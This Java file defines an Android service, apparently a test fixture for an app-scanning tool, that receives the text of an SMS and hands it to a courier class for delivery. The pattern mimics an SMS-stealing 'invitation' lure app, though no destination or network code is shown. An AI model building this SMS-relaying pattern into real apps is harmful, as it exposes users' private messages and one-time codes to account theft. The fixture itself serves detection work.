package sim.packpeek.undangan;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

/** TEST SAMPLE ONLY, never runs (hasCode="false"). Receives the SMS text and passes it on. */
public class UploadService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Courier.deliver(intent.getStringExtra("body"));
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
